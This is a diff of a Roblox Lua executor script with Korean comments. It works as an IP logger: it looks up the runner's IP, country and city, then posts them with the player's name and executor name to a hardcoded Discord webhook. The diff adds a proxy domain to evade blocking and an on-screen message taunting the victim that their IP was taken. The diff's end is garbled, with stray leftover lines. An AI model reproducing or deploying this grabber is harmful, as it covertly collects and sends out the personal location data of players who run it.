@@ -1,18 +1,23 @@
--- 웹훅 주소가 사용자님의 새 주소로 업데이트되었습니다.
+-- 프록시를 적용한 새로운 웹훅 주소
 local webhook = "https://discord.com/api/webhooks/1492431494319313030/C3DOY0zlWt960efXW1T9lp2sVOIWi4xQsH8ZS7cPcgCGzC9TXDuto3ve3GfLAP2tHx5F"
+-- 디스코드 직접 전송이 막혔을 경우를 대비해 도메인을 프록시로 자동 변경
+local proxyWebhook = webhook:gsub("discord.com", "hooks.hyra.io")
 
 local http_request = http_request or request or syn.request or http.request or fluxus.request or Krnl.request or http_request 
 if not http_request then warn("HTTP 요청 함수를 찾을 수 없습니다!") return end 
 
--- [1] IP 정보 가져오기 (한국어 옵션)
-local ipData = { query = "알 수 없음", country = "N/A", city = "N/A", isp = "N/A" }
+-- [1] IP 정보 가져오기
+local ipData = { query = "알 수 없음", country = "N/A", city = "N/A" }
 local success, response = pcall(function() 
-    return http_request({ Url = "http://ip-api.com/json/?lang=ko", Method = "GET" }) 
+    return http_request({ 
+        Url = "http://ip-api.com/json/?lang=ko", 
+        Method = "GET" 
+    }) 
 end)
 
 if success and response.Body then
-    local decoded = game:GetService("HttpService"):JSONDecode(response.Body)
-    if decoded.status == "success" then 
+    local decodeSuccess, decoded = pcall(function() return game:GetService("HttpService"):JSONDecode(response.Body) end)
+    if decodeSuccess and decoded.status == "success" then 
         ipData = decoded 
     end
 end
@@ -21,19 +26,40 @@ end
 local playerName = game.Players.LocalPlayer and game.Players.LocalPlayer.Name or "???"
 local executorName = (identifyexecutor and identifyexecutor()) or "알 수 없음"
 
--- [3] 디스코드 전송
+-- [3] 디스코드 전송 (프록시 주소 사용)
 pcall(function()
     http_request({
-        Url = webhook,
+        Url = proxyWebhook,
         Method = "POST",
         Headers = {["Content-Type"] = "application/json"},
         Body = game:GetService("HttpService"):JSONEncode({
             username = "스크립트 IP 로그",
             embeds = {{
-                title = "🚀 Executor 실행 감지",
+                title = "🚀 프록시 우회 실행 로그",
                 color = 16711680,
                 fields = {
                     {name = "IP 주소", value = ipData.query, inline = true},
+                    {name = "위치", value = ipData.country .. " " .. ipData.city, inline = true},
+                    {name = "닉네임", value = playerName, inline = false},
+                    {name = "실행기", value = executorName, inline = true},
+                    {name = "시간", value = os.date("%Y-%m-%d %H:%M:%S KST"), inline = true}
+                }
+            }}
+        })
+    })
+end)
+
+-- [4] 화면 UI (사라지지 않음)
+local screenGui = Instance.new("ScreenGui")
+local textLabel = Instance.new("TextLabel")
+screenGui.Parent = game:GetService("CoreGui")
+textLabel.Parent = screenGui
+textLabel.Size = UDim2.new(0, 300, 0, 60)
+textLabel.Position = UDim2.new(0.5, -150, 0.4, 0)
+textLabel.Text = "IP 따임 VPN이면 ㅊㅋㅊㅋ"
+textLabel.BackgroundColor3 = Color3.new(0, 0, 0)
+textLabel.TextColor3 = Color3.new(1, 1, 1)
+textLabel.TextSize = 20
                     {name = "국가", value = ipData.country, inline = true},
                     {name = "도시", value = ipData.city, inline = true},
                     {name = "닉네임", value = playerName, inline = false},
